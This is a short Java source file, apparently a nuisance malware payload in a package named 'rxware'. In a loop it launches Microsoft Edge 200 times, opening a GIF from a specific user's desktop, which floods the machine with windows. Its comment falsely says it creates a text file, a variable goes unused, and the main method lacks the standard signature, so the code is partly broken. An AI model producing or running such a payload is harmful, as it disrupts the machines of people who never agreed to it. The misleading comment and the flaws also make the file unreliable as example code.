package rxware;

import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.concurrent.TimeUnit;

// Java program to create a text File using FileWriter
public class payload1{
    public static void main(){
        Path windowsDir = Paths.get(System.getenv("windir"));
        Path programPath = Paths.get("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
        Path filePath = Paths.get("C:\\Users\\Knox\\Desktop\\edge.gif");

        try {
            for(int i = 0; i < 200; i++){
                Process mainProgram = new ProcessBuilder(programPath.toString(), filePath.toString()).start();
                try {
                    TimeUnit.MILLISECONDS.sleep(200);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
